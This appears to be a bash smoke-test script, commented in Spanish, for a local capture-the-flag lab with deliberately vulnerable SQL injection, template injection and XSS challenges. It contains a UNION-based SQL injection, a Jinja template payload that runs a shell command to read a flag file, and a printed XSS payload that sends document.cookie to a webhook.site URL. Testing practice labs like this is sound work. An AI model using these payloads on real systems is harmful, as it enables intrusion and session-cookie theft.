#!/usr/bin/env bash
# scripts/test_challenges.sh
# Smoke tests automatizados para SQLi y SSTI.
# XSS no se testea automáticamente (necesita webhook externo + espera de 30s al bot).
set -euo pipefail

source .env

# ── Helper: levanta container, espera healthcheck, mata al salir ──────────────
run_and_kill() {
  local name=$1 image=$2 hostport=$3 intport=$4
  local cid
  cid=$(docker run -d --rm -p "${hostport}:${intport}" "$image")

  # Registrar cleanup en RETURN del contexto actual
  # (se llama al final de la función que invocó run_and_kill)
  # Usamos una variable global para el cleanup
  CURRENT_CID="$cid"
  trap 'docker kill "$CURRENT_CID" >/dev/null 2>&1 || true' RETURN

  echo "  [${name}] Container ${cid:0:12} arrancado en :${hostport}"

  # Esperar healthcheck (hasta 20s)
  local ok=false
  for _ in {1..20}; do
    if curl -sf "http://localhost:${hostport}/health" >/dev/null 2>&1; then
      ok=true
      break
    fi
    sleep 1
  done

  if [[ "$ok" == false ]]; then
    echo "  [${name}] ERROR: healthcheck falló después de 20s"
    docker kill "$cid" >/dev/null 2>&1 || true
    exit 1
  fi

  echo "  [${name}] Healthcheck OK"
}

cleanup_container() {
  [[ -n "${CURRENT_CID:-}" ]] && docker kill "$CURRENT_CID" >/dev/null 2>&1 || true
  CURRENT_CID=""
}

PASS=0
FAIL=0

# ── Test: SQLi ────────────────────────────────────────────────────────────────
echo ""
echo "[sqli] Iniciando test..."
run_and_kill sqli ctf-sqli:latest 15001 5000

# Login legítimo debe fallar
resp=$(curl -s -X POST http://localhost:15001/login \
  --data-urlencode "username=noexiste" \
  --data-urlencode "password=noexiste")
if echo "$resp" | grep -q "Credenciales incorrectas"; then
  echo "  [sqli] ✓ Login legítimo rechazado correctamente"
  ((PASS++))
else
  echo "  [sqli] ✗ FAIL: login legítimo no mostró mensaje de rechazo"
  ((FAIL++))
fi

# UNION-based para extraer flag
resp=$(curl -s -X POST http://localhost:15001/login \
  --data-urlencode "username=' UNION SELECT 1,value,3 FROM flags --" \
  --data-urlencode "password=x")
if echo "$resp" | grep -q "$FLAG_SQLI"; then
  echo "  [sqli] ✓ UNION injection devuelve la flag correcta"
  ((PASS++))
else
  echo "  [sqli] ✗ FAIL: flag no encontrada en respuesta"
  echo "  Respuesta recibida: $(echo "$resp" | head -5)"
  ((FAIL++))
fi

cleanup_container

# ── Test: SSTI ────────────────────────────────────────────────────────────────
echo ""
echo "[ssti] Iniciando test..."
run_and_kill ssti ctf-ssti:latest 15003 5000

# Sanity check: {{7*7}} → 49
resp=$(curl -sG http://localhost:15003/hello --data-urlencode "name={{7*7}}")
if echo "$resp" | grep -q "49"; then
  echo "  [ssti] ✓ {{7*7}} devuelve 49 (template evaluation funciona)"
  ((PASS++))
else
  echo "  [ssti] ✗ FAIL: {{7*7}} no devolvió 49"
  echo "  Respuesta: $resp"
  ((FAIL++))
fi

# Payload de lectura de archivo
resp=$(curl -sG http://localhost:15003/hello \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}")
if echo "$resp" | grep -q "$FLAG_SSTI"; then
  echo "  [ssti] ✓ Payload RCE lee /flag.txt correctamente"
  ((PASS++))
else
  echo "  [ssti] ✗ FAIL: payload no devolvió la flag"
  echo "  Respuesta: $resp"
  ((FAIL++))
fi

cleanup_container

# ── Resumen ───────────────────────────────────────────────────────────────────
echo ""
echo "══════════════════════════════════════════"
echo "  Resultados: ${PASS} pasados, ${FAIL} fallidos"
echo "══════════════════════════════════════════"
echo ""
echo "  [xss] Test manual requerido — ver FASE1_DETALLADO.md §2.6"
echo "        1. Abrir http://localhost:5002/ (docker run -p 5002:3000 ctf-xss:latest)"
echo "        2. Postear: <script>fetch('https://webhook.site/TU_ID?c='+document.cookie)</script>"
echo "        3. Esperar ~30s y verificar en webhook.site"
echo ""

[[ $FAIL -eq 0 ]] && exit 0 || exit 1
